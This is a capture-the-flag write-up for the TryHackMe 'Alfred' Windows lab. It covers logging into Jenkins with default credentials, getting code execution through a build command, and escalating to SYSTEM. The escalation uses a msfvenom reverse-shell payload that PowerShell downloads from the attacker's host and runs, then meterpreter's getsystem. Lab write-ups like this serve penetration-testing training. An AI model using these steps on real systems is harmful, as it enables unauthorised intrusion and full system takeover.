# THM: Alfred
# OS: Windows

### Foothold

[WEB]
**Port 8080**
- Weak creds are in use:
  admin:admin
- Found RCE
  1. Navigate -> http://$ip:8080/view/all/job/project
  2. Change the command run on build from `Configure`
  3. Build project

### PrivEsc

**Get meterpreter shell**
1. Start msfconsole:
  `sudo msfconsole`
2. Use multi/handler:
  `use exploit/multi/handler`
3. Change the payload type and options than run
  `set payload windows/x64/meterpreter/reverse_tcp`
  ...
  `run`
4. Create a payload:
  `msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 shikata_ga_nai LHOST=tun0 LPORT=[PORT] -f exe -o shell.exe`
5. Transfer the payload:
  `powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell.exe','shell.exe')"`
6. Run the payload:
  `.\shell.exe`
7. You will get a meterpreter shell

[ENUM]
1. `whoami /priv`
  We have `SeImpersonate` privilege, we can try to get system with meterpreter's `getsystem`
  
[EXPLOIT]
2. `getsystem`
